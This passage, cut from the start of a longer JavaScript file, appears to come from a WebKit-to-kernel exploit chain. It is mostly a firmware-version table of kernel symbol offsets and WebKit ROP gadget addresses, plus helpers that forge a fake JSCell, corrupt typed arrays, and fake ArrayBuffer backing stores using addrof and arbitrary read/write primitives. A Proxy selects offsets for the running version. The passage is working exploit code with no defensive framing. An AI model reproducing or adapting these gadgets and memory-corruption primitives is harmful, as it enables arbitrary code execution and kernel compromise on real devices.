        return webkit_base.add(0x2d45ce7);
      },
      get wk_MOV_RAX_QWORD_PTR_RDI_RET() {
        return webkit_base.add(0x253b33f);
      },
      get wk_PUSH_QWORD_PTR_RBX_JMP_QWORD_PTR_RAX() {
        return webkit_base.add(0x2db1696);
      },
    },
    0x20: {
      k_sysctl___kern_smp_cpus: 0x27913a0,
      k_route_output_rtmsg2_ret: 0xa9dec5,

      wk_pthread_create: 0x366ce90,
      wk_pthread_join: 0x366ced0,

      get wk_LEAVE_RET() {
        return webkit_base.add(0x31b7fa5);
      },
      get wk_POP_R8_RET() {
        return webkit_base.add(0x35e0118);
      },
      get wk_POP_R9_RET() {
        return webkit_base.add(0x433d66);
      },
      get wk_POP_R11_RET() {
        return webkit_base.add(0x2f97921);
      },
      get wk_POP_R12_RET() {
        return webkit_base.add(0x3246243);
      },
      get wk_POP_R13_RET() {
        return webkit_base.add(0x1bd6ef);
      },
      get wk_POP_R14_RET() {
        return webkit_base.add(0x35c1e49);
      },
      get wk_POP_R15_RET() {
        return webkit_base.add(0x33f310d);
      },
      get wk_POP_RAX_RET() {
        return webkit_base.add(0x366a11a);
      },
      get wk_POP_RBX_RET() {
        return webkit_base.add(0x15f2841);
      },
      get wk_POP_RCX_RET() {
        return webkit_base.add(0x366a012);
      },
      get wk_POP_RDX_RET() {
        return webkit_base.add(0x35b8d95);
      },
      get wk_POP_RDI_RET() {
        return webkit_base.add(0x8ad356);
      },
      get wk_POP_RSI_RET() {
        return webkit_base.add(0x80fd98);
      },
      get wk_POP_RBP_RET() {
        return webkit_base.add(0x11be3d7);
      },
      get wk_POP_RSP_RET() {
        return webkit_base.add(0x8ad656);
      },
      get wk_MOV_QWORD_PTR_RDI_RAX_RET() {
        return webkit_base.add(0x2d45d07);
      },
      get wk_MOV_RAX_QWORD_PTR_RDI_RET() {
        return webkit_base.add(0x253b35f);
      },
      get wk_PUSH_QWORD_PTR_RBX_JMP_QWORD_PTR_RAX() {
        return webkit_base.add(0x2db16b6);
      },
    },
    0x40: {
      k_route_output_rtmsg2_ret: 0xa9e155,
    },
    0x60: {
      k_route_output_rtmsg2_ret: 0xa9e3d5,
    },
  },
  9: {
    0: {
      k_sysctl___kern_smp_cpus: 0x2787ab0,
      k_route_output_rtmsg2_ret: 0xac1451,
      k_ntpadj_lock: 0x1a588e8,
      k_allproc: 0x33f5d50,

      lk_close: 0x1b7b0,
      lk__error: 0xf160,
      lc_strerror: 0x765a0,

      wk_pthread_create: 0x2b3d0b0,
      wk_pthread_join: 0x2b3d0f0,
      wk_expm1_builtin: 0x35b88,
      wk___imp___error: 0x33c1958,
      wk___imp_strerror: 0x33c1978,

      wk_TypedArray_m_mode: 0x28,
      wk_TypedArray_m_byteOffset: 0x20,
      wk_ArrayBuffer_m_contents_m_sizeInBytes: 0x30,
      wk_ArrayBuffer_m_contents_m_maxByteLength: 0x38,
      wk_JSGlobalObject_m_vm_topEntryFrame: 0x9cf0,

      get wk_LEAVE_RET() {
        return webkit_base.add(0x1649836);
      },
      get wk_POP_R8_RET() {
        return webkit_base.add(0x25a5972);
      },
      get wk_POP_R9_RET() {
        return webkit_base.add(0x248dbf2);
      },
      get wk_POP_R11_RET() {
        return webkit_base.add(0x1d41029);
      },
      get wk_POP_R12_RET() {
        return webkit_base.add(0x2847e33);
      },
      get wk_POP_R13_RET() {
        return webkit_base.add(0xf0a113);
      },
      get wk_POP_R14_RET() {
        return webkit_base.add(0x29ee14e);
      },
      get wk_POP_R15_RET() {
        return webkit_base.add(0x2abb14e);
      },
      get wk_POP_RAX_RET() {
        return webkit_base.add(0x297ff14);
      },
      get wk_POP_RBX_RET() {
        return webkit_base.add(0x17c0821);
      },
      get wk_POP_RCX_RET() {
        return webkit_base.add(0x2a793bb);
      },
      get wk_POP_RDX_RET() {
        return webkit_base.add(0x5fea3a);
      },
      get wk_POP_RDI_RET() {
        return webkit_base.add(0x1768b5e);
      },
      get wk_POP_RSI_RET() {
        return webkit_base.add(0x1434288);
      },
      get wk_POP_RBP_RET() {
        return webkit_base.add(0x1bc9196);
      },
      get wk_POP_RSP_RET() {
        return webkit_base.add(0x2b31ac0);
      },
      get wk_MOV_QWORD_PTR_RDI_RAX_RET() {
        return webkit_base.add(0x26c8d5b);
      },
      get wk_MOV_RAX_QWORD_PTR_RDI_RET() {
        return webkit_base.add(0x1d3a886);
      },
      get wk_PUSH_QWORD_PTR_RBX_JMP_QWORD_PTR_RAX() {
        return webkit_base.add(0x18af53);
      },
      make_fake_container(jscell) {
        const container = {
          jscell: jscell, // NaN-boxed, fix later
          butterfly: null, // becomes 0x2, fix later
          vector: arw.victim,
          length: true, // becomes 0x7, fix later
          byteOffset: null, // becomes 0x2, fix later
          mode: null, // becomes 0x2, fix later
        };

        delete container.butterfly; // becomes 0
        delete container.byteOffset; // becomes 0
        delete container.mode; // becomes 0

        return container;
      },
      make_master(victim_addr) {
        arw.victim.setBInt(0x10, victim_addr, true);
        arw.victim.setBInt(impl.wk_TypedArray_m_byteOffset, 0, true);
        arw.victim.setBInt(impl.wk_TypedArray_m_mode, 0x30, true); // TypedArrayMode:OversizeTypedArray
      },
      ab_fake(ab, addr, len) {
        const ab_addr = arw.addrof(ab);
        const m_impl = arw.view(ab_addr).getBInt(0x10, true);
        const m_data = arw.view(m_impl).getBInt(0x10, true);

        ab.m_data = m_data;

        arw.view(m_impl).setBInt(0, 2, true); // DeferrableRefCountedBase::m_refCount
        arw.view(m_impl).setBInt(impl.wk_ArrayBuffer_m_contents_m_data, addr, true);
        arw.view(m_impl).setBInt(impl.wk_ArrayBuffer_m_contents_m_sizeInBytes, len, true);
        arw.view(m_impl).setBInt(impl.wk_ArrayBuffer_m_contents_m_maxByteLength, len, true);
      },
      ab_free(ab) {
        const ab_addr = arw.addrof(ab);
        const m_impl = arw.view(ab_addr).getBInt(0x10, true);

        arw.view(m_impl).setBInt(0, 0, true); // DeferrableRefCountedBase::m_refCount
        arw.view(m_impl).setBInt(impl.wk_ArrayBuffer_m_contents_m_data, ab.m_data, true);
        arw.view(m_impl).setBInt(impl.wk_ArrayBuffer_m_contents_m_sizeInBytes, 0, true);
        arw.view(m_impl).setBInt(impl.wk_ArrayBuffer_m_contents_m_maxByteLength, 0, true);
      },
    },
    5: {
      k_route_output_rtmsg2_ret: 0xac1681,
    },
    0x20: {
      k_route_output_rtmsg2_ret: 0xac1471,

      wk_pthread_create: 0x2b3d090,
      wk_pthread_join: 0x2b3d0d0,

      get wk_LEAVE_RET() {
        return webkit_base.add(0x2822e42);
      },
      get wk_POP_R8_RET() {
        return webkit_base.add(0x25a5952);
      },
      get wk_POP_R9_RET() {
        return webkit_base.add(0x248dbd2);
      },
      get wk_POP_R11_RET() {
        return webkit_base.add(0x1d41009);
      },
      get wk_POP_R12_RET() {
        return webkit_base.add(0x2847e13);
      },
      get wk_POP_R13_RET() {
        return webkit_base.add(0xf0a0f3);
      },
      get wk_POP_R14_RET() {
        return webkit_base.add(0x29ee12e);
      },
      get wk_POP_R15_RET() {
        return webkit_base.add(0x2abb12e);
      },
      get wk_POP_RAX_RET() {
        return webkit_base.add(0x5feefc);
      },
      get wk_POP_RBX_RET() {
        return webkit_base.add(0x177fcee);
      },
      get wk_POP_RCX_RET() {
        return webkit_base.add(0x56f16e);
      },
      get wk_POP_RDX_RET() {
        return webkit_base.add(0x516f42);
      },
      get wk_POP_RDI_RET() {
        return webkit_base.add(0x1768b3e);
      },
      get wk_POP_RSI_RET() {
        return webkit_base.add(0x164fd0e);
      },
      get wk_POP_RBP_RET() {
        return webkit_base.add(0x164fdfe);
      },
      get wk_POP_RSP_RET() {
        return webkit_base.add(0x164fef6);
      },
      get wk_MOV_QWORD_PTR_RDI_RAX_RET() {
        return webkit_base.add(0x26c8d3b);
      },
      get wk_MOV_RAX_QWORD_PTR_RDI_RET() {
        return webkit_base.add(0x1d3a866);
      },
      get wk_PUSH_QWORD_PTR_RBX_JMP_QWORD_PTR_RAX() {
        return webkit_base.add(0x18af33);
      },
    },
    0x40: {
      k_route_output_rtmsg2_ret: 0xac19e1,

      wk_pthread_create: 0x2b3d440,
      wk_pthread_join: 0x2b3d480,
      wk___imp___error: 0x33c1968,
      wk___imp_strerror: 0x33c1988,

      get wk_LEAVE_RET() {
        return webkit_base.add(0x29827cb);
      },
      get wk_POP_R8_RET() {
        return webkit_base.add(0x2602347);
      },
      get wk_POP_R9_RET() {
        return webkit_base.add(0x248de32);
      },
      get wk_POP_R11_RET() {
        return webkit_base.add(0x2616773);
      },
      get wk_POP_R12_RET() {
        return webkit_base.add(0x28481c3);
      },
      get wk_POP_R13_RET() {
        return webkit_base.add(0);
      },
      get wk_POP_R14_RET() {
        return webkit_base.add(0x29ee4de);
      },
      get wk_POP_R15_RET() {
        return webkit_base.add(0x2abb4de);
      },
      get wk_POP_RAX_RET() {
        return webkit_base.add(0x2a7ff14);
      },
      get wk_POP_RBX_RET() {
        return webkit_base.add(0x17c0821);
      },
      get wk_POP_RCX_RET() {
        return webkit_base.add(0x15037b8);
      },
      get wk_POP_RDX_RET() {
        return webkit_base.add(0x5fea3a);
      },
      get wk_POP_RDI_RET() {
        return webkit_base.add(0x1b3527d);
      },
      get wk_POP_RSI_RET() {
        return webkit_base.add(0x1434288);
      },
      get wk_POP_RBP_RET() {
        return webkit_base.add(0x1bc93d6);
      },
      get wk_POP_RSP_RET() {
        return webkit_base.add(0x2ade592);
      },
      get wk_MOV_QWORD_PTR_RDI_RAX_RET() {
        return webkit_base.add(0x26c90eb);
      },
      get wk_MOV_RAX_QWORD_PTR_RDI_RET() {
        return webkit_base.add(0x1d3aac6);
      },
    },
    0x60: {
      k_route_output_rtmsg2_ret: 0xac1bc1,
    },
  },
  10: {
    0: {
      k_sysctl___kern_smp_cpus: 0x27a8130,
      k_route_output_rtmsg2_ret: 0xadf87f,
      k_ntpadj_lock: 0x1a78978,
      k_allproc: 0x3425d70,
      k_aio_table: 0xc40,

      lk_close: 0x1ba10,
      lk__error: 0xf0d0,
      lc_strerror: 0x76030,

      wk_pthread_create: 0x2d3a310,
      wk_pthread_join: 0x2d3a350,
      wk_expm1_builtin: 0x1cd0,
      wk___imp___error: 0x35cd748,
      wk___imp_strerror: 0x35cd768,

      get wk_LEAVE_RET() {
        return webkit_base.add(0x2c11a4b);
      },
      get wk_POP_R8_RET() {
        return webkit_base.add(0x2739d82);
      },
      get wk_POP_R9_RET() {
        return webkit_base.add(0x25ff162);
      },
      get wk_POP_R11_RET() {
        return webkit_base.add(0x1e25f79);
      },
      get wk_POP_R12_RET() {
        return webkit_base.add(0x2a260e3);
      },
      get wk_POP_R13_RET() {
        return webkit_base.add(0);
      },
      get wk_POP_R14_RET() {
        return webkit_base.add(0x2cb3c36);
      },
      get wk_POP_R15_RET() {
        return webkit_base.add(0x2be0519);
      },
      get wk_POP_RAX_RET() {
        return webkit_base.add(0x81146e);
      },
      get wk_POP_RBX_RET() {
        return webkit_base.add(0x265b1e1);
      },
      get wk_POP_RCX_RET() {
        return webkit_base.add(0x7e968d);
      },
      get wk_POP_RDX_RET() {
        return webkit_base.add(0x2c6ea00);
      },
      get wk_POP_RDI_RET() {
        return webkit_base.add(0x148cac7);
      },
      get wk_POP_RSI_RET() {
        return webkit_base.add(0x2d14bba);
      },
      get wk_POP_RBP_RET() {
        return webkit_base.add(0x1c90e1a);
      },
      get wk_POP_RSP_RET() {
        return webkit_base.add(0x15d7231);
      },
      get wk_MOV_QWORD_PTR_RDI_RAX_RET() {
        return webkit_base.add(0x2881297);
      },
      get wk_MOV_RAX_QWORD_PTR_RDI_RET() {
        return webkit_base.add(0x2aa9353);
      },
      get wk_PUSH_QWORD_PTR_RBX_JMP_QWORD_PTR_RAX() {
        return webkit_base.add(0x133982);
      },
    },
    0x20: {
      k_route_output_rtmsg2_ret: 0xadfa9f,
    },
    0x60: {
      k_route_output_rtmsg2_ret: 0xadfa7f,
    },
  },
  11: {
    0: {
      k_sysctl___kern_smp_cpus: 0x2929e50,
      k_route_output_rtmsg2_ret: 0xb52b61,
      k_ntpadj_lock: 0x1af9f18,
      k_allproc: 0x35a5d70,

      lk_close: 0x1bd30,
      lk__error: 0xf340,
      lc_strerror: 0x77070,

      wk_pthread_create: 0x2c784a0,
      wk_pthread_join: 0x2c784e0,
      wk_expm1_builtin: 0x1eed0,
      wk___imp___error: 0x34f57b0,
      wk___imp_strerror: 0x34f57d0,

      get wk_LEAVE_RET() {
        return webkit_base.add(0x2a00b0a);
      },
      get wk_POP_R8_RET() {
        return webkit_base.add(0x26a7622);
      },
      get wk_POP_R9_RET() {
        return webkit_base.add(0x2578242);
      },
      get wk_POP_R11_RET() {
        return webkit_base.add(0x1daf6f9);
      },
      get wk_POP_R12_RET() {
        return webkit_base.add(0x29878e3);
      },
      get wk_POP_R13_RET() {
        return webkit_base.add(0x1bcfb29);
      },
      get wk_POP_R14_RET() {
        return webkit_base.add(0x2bf1866);
      },
      get wk_POP_R15_RET() {
        return webkit_base.add(0x2b2cbc6);
      },
      get wk_POP_RAX_RET() {
        return webkit_base.add(0x6a8666);
      },
      get wk_POP_RBX_RET() {
        return webkit_base.add(0x274f359);
      },
      get wk_POP_RCX_RET() {
        return webkit_base.add(0x2c51507);
      },
      get wk_POP_RDX_RET() {
        return webkit_base.add(0x462742);
      },
      get wk_POP_RDI_RET() {
        return webkit_base.add(0x7e956d);
      },
      get wk_POP_RSI_RET() {
        return webkit_base.add(0x2c52e80);
      },
      get wk_POP_RBP_RET() {
        return webkit_base.add(0x1c2b19a);
      },
      get wk_POP_RSP_RET() {
        return webkit_base.add(0x2542850);
      },
      get wk_MOV_QWORD_PTR_RDI_RAX_RET() {
        return webkit_base.add(0x27ee067);
      },
      get wk_MOV_RAX_QWORD_PTR_RDI_RET() {
        return webkit_base.add(0x2a065f3);
      },
      get wk_PUSH_QWORD_PTR_RBX_JMP_QWORD_PTR_RAX() {
        return webkit_base.add(0x642b2);
      },
    },
    0x20: {
      wk_pthread_create: 0x2c78920,
      wk_pthread_join: 0x2c78960,

      get wk_LEAVE_RET() {
        return webkit_base.add(0x13eb626);
      },
      get wk_POP_R8_RET() {
        return webkit_base.add(0x26a7aa2);
      },
      get wk_POP_R9_RET() {
        return webkit_base.add(0x25786c2);
      },
      get wk_POP_R11_RET() {
        return webkit_base.add(0x1dafb79);
      },
      get wk_POP_R12_RET() {
        return webkit_base.add(0x2987d63);
      },
      get wk_POP_R13_RET() {
        return webkit_base.add(0x1bcffa9);
      },
      get wk_POP_R14_RET() {
        return webkit_base.add(0x2bf1ce6);
      },
      get wk_POP_R15_RET() {
        return webkit_base.add(0x2b2d046);
      },
      get wk_POP_RAX_RET() {
        return webkit_base.add(0x2b8d008);
      },
      get wk_POP_RBX_RET() {
        return webkit_base.add(0x737e9e);
      },
      get wk_POP_RCX_RET() {
        return webkit_base.add(0x2c51987);
      },
      get wk_POP_RDX_RET() {
        return webkit_base.add(0x2bd687a);
      },
      get wk_POP_RDI_RET() {
        return webkit_base.add(0x10482ed);
      },
      get wk_POP_RSI_RET() {
        return webkit_base.add(0x2c53300);
      },
      get wk_POP_RBP_RET() {
        return webkit_base.add(0x1c2b61a);
      },
      get wk_POP_RSP_RET() {
        return webkit_base.add(0x2c191e2);
      },
      get wk_MOV_QWORD_PTR_RDI_RAX_RET() {
        return webkit_base.add(0x27ee4e7);
      },
      get wk_MOV_RAX_QWORD_PTR_RDI_RET() {
        return webkit_base.add(0x2a06a73);
      },
      get wk_PUSH_QWORD_PTR_RBX_JMP_QWORD_PTR_RAX() {
        return webkit_base.add(0x642b2);
      },
    },
    0x40: {
      k_sysctl___kern_smp_cpus: 0x2929e90,
      k_route_output_rtmsg2_ret: 0xb53751,
      k_ntpadj_lock: 0x1af9f38,
    },
    0x60: {
      k_sysctl___kern_smp_cpus: 0x2929ed0,
      k_route_output_rtmsg2_ret: 0xb53301,
    },
  },
  12: {
    0: {
      k_sysctl___kern_smp_cpus: 0x294b400,
      k_route_output_rtmsg2_ret: 0xb6ec71,
      k_ntpadj_lock: 0x1b1ab78,
      k_aio_table: 0xc48,
      k_allproc: 0x35d5e00,

      lk_close: 0x1c280,
      lk__error: 0xf740,
      lc_strerror: 0x79160,

      wk_pthread_create: 0x2c908a0,
      wk_pthread_join: 0x2c908e0,
      wk_expm1_builtin: 0x3b680,
      wk___imp___error: 0x350dc20,
      wk___imp_strerror: 0x350dc40,

      get wk_LEAVE_RET() {
        return webkit_base.add(0x27d9ad3);
      },
      get wk_POP_R8_RET() {
        return webkit_base.add(0x26bff12);
      },
      get wk_POP_R9_RET() {
        return webkit_base.add(0x258fdc2);
      },
      get wk_POP_R11_RET() {
        return webkit_base.add(0x1dc48b9);
      },
      get wk_POP_R12_RET() {
        return webkit_base.add(0x29a06c3);
      },
      get wk_POP_R13_RET() {
        return webkit_base.add(0x1be2659);
      },
      get wk_POP_R14_RET() {
        return webkit_base.add(0x2c0a1a6);
      },
      get wk_POP_R15_RET() {
        return webkit_base.add(0x2b45966);
      },
      get wk_POP_RAX_RET() {
        return webkit_base.add(0x2760715);
      },
      get wk_POP_RBX_RET() {
        return webkit_base.add(0x1053b7d);
      },
      get wk_POP_RCX_RET() {
        return webkit_base.add(0x4bfd06);
      },
      get wk_POP_RDX_RET() {
        return webkit_base.add(0x291919a);
      },
      get wk_POP_RDI_RET() {
        return webkit_base.add(0x245c458);
      },
      get wk_POP_RSI_RET() {
        return webkit_base.add(0x2c6b290);
      },
      get wk_POP_RBP_RET() {
        return webkit_base.add(0x4bf0df);
      },
      get wk_POP_RSP_RET() {
        return webkit_base.add(0x2c316e2);
      },
      get wk_MOV_QWORD_PTR_RDI_RAX_RET() {
        return webkit_base.add(0x234f150);
      },
      get wk_MOV_RAX_QWORD_PTR_RDI_RET() {
        return webkit_base.add(0x2a1f883);
      },
      get wk_PUSH_QWORD_PTR_RBX_JMP_QWORD_PTR_RAX() {
        return webkit_base.add(0x80582);
      },
    },
    0x20: {
      k_route_output_rtmsg2_ret: 0xb6eaf1,
    },
    0x40: {
      lk_close: 0x1c2a0,
    },
    0x60: {
      k_route_output_rtmsg2_ret: 0xb6eb51,
    },
  },
  13: {
    0: {
      k_sysctl___kern_smp_cpus: 0x28bec80,
      k_route_output_rtmsg2_ret: 0xad8582,
      k_ntpadj_lock: 0x1a8ba78,
      k_allproc: 0x3575e00,

      lk_close: 0x1c310,
      lk__error: 0xf7d0,
      lc_strerror: 0x7b730,

      wk_pthread_create: 0x2ad7ee0,
      wk_pthread_join: 0x2ad7f20,
      wk_expm1_builtin: 0x57850,
      wk___imp___error: 0x3352230,
      wk___imp_strerror: 0x3352250,

      get wk_LEAVE_RET() {
        return webkit_base.add(0x29a4b7b);
      },
      get wk_POP_R8_RET() {
        return webkit_base.add(0x2562410);
      },
      get wk_POP_R9_RET() {
        return webkit_base.add(0x2453512);
      },
      get wk_POP_R11_RET() {
        return webkit_base.add(0x1d0bc19);
      },
      get wk_POP_R12_RET() {
        return webkit_base.add(0x27fa803);
      },
      get wk_POP_R13_RET() {
        return webkit_base.add(0x25c2db9);
      },
      get wk_POP_R14_RET() {
        return webkit_base.add(0x29aa250);
      },
      get wk_POP_R15_RET() {
        return webkit_base.add(0x2a8c182);
      },
      get wk_POP_RAX_RET() {
        return webkit_base.add(0x28e8924);
      },
      get wk_POP_RBX_RET() {
        return webkit_base.add(0x1610dfe);
      },
      get wk_POP_RCX_RET() {
        return webkit_base.add(0x2638ff7);
      },
      get wk_POP_RDX_RET() {
        return webkit_base.add(0x6ef9e2);
      },
      get wk_POP_RDI_RET() {
        return webkit_base.add(0x2a8c183);
      },
      get wk_POP_RSI_RET() {
        return webkit_base.add(0x2abbbae);
      },
      get wk_POP_RBP_RET() {
        return webkit_base.add(0x1b9a82a);
      },
      get wk_POP_RSP_RET() {
        return webkit_base.add(0x6e9aad);
      },
      get wk_MOV_QWORD_PTR_RDI_RAX_RET() {
        return webkit_base.add(0x222eae0);
      },
      get wk_MOV_RAX_QWORD_PTR_RDI_RET() {
        return webkit_base.add(0x2870693);
      },
      get wk_PUSH_QWORD_PTR_RBX_JMP_QWORD_PTR_RAX() {
        return webkit_base.add(0x66d82);
      },
    },
    0x20: {
      k_route_output_rtmsg2_ret: 0xad8790,
    },
    0x40: {
      k_sysctl___kern_smp_cpus: 0x28bee80,
      k_route_output_rtmsg2_ret: 0xad8aa0,
      k_ntpadj_lock: 0x1a8bab8,
      k_allproc: 0x3579e80,

      wk_pthread_create: 0x2ad7fa0,
      wk_pthread_join: 0x2ad7fe0,
      wk___imp___error: 0x334e230,
      wk___imp_strerror: 0x334e250,

      get wk_LEAVE_RET() {
        return webkit_base.add(0x12a3433);
      },
      get wk_POP_R8_RET() {
        return webkit_base.add(0x25624d0);
      },
      get wk_POP_R9_RET() {
        return webkit_base.add(0x24535d2);
      },
      get wk_POP_R11_RET() {
        return webkit_base.add(0x1d0bcd9);
      },
      get wk_POP_R12_RET() {
        return webkit_base.add(0x27fa8c3);
      },
      get wk_POP_R13_RET() {
        return webkit_base.add(0x1b40609);
      },
      get wk_POP_R14_RET() {
        return webkit_base.add(0x29aa310);
      },
      get wk_POP_R15_RET() {
        return webkit_base.add(0x2a8c242);
      },
      get wk_POP_RAX_RET() {
        return webkit_base.add(0x22a12c6);
      },
      get wk_POP_RBX_RET() {
        return webkit_base.add(0x2977561);
      },
      get wk_POP_RCX_RET() {
        return webkit_base.add(0x153456b);
      },
      get wk_POP_RDX_RET() {
        return webkit_base.add(0x1f2216);
      },
      get wk_POP_RDI_RET() {
        return webkit_base.add(0x731acc);
      },
      get wk_POP_RSI_RET() {
        return webkit_base.add(0x2ab2990);
      },
      get wk_POP_RBP_RET() {
        return webkit_base.add(0x1b9a8ea);
      },
      get wk_POP_RSP_RET() {
        return webkit_base.add(0x6e9aad);
      },
      get wk_MOV_QWORD_PTR_RDI_RAX_RET() {
        return webkit_base.add(0x222eba0);
      },
      get wk_MOV_RAX_QWORD_PTR_RDI_RET() {
        return webkit_base.add(0x2870753);
      },
      get wk_PUSH_QWORD_PTR_RBX_JMP_QWORD_PTR_RAX() {
        return webkit_base.add(0x66d82);
      },
    },
    0x60: {
      k_sysctl___kern_smp_cpus: 0x28cef60,
      k_route_output_rtmsg2_ret: 0xae2da0,
      k_ntpadj_lock: 0x1a9bab8,
      k_allproc: 0x3589e80,
    },
  },
};

const impl_cache = new Map();
const impl = new Proxy(impl_map, {
  get(target, prop) {
    if (impl_cache.has(prop)) {
      return impl_cache.get(prop);
    }

    for (let major = version.major; major >= 0; major--) {
      if (major in target) {
        const minor_max = major === version.major ? version.minor : 0xff;

        for (let minor = minor_max; minor >= 0; minor--) {
          if (minor in target[major] && prop in target[major][minor]) {
            const value = target[major][minor][prop];
            if (value === null) {
              throw new Error(`${prop} is not supported for ${version}`);
            }

            if (value !== undefined) {
              impl_cache.set(prop, value);
              return value;
            }
          }
        }
      }
    }

    throw new Error(`${version} has no ${prop} !!`);
  },
});
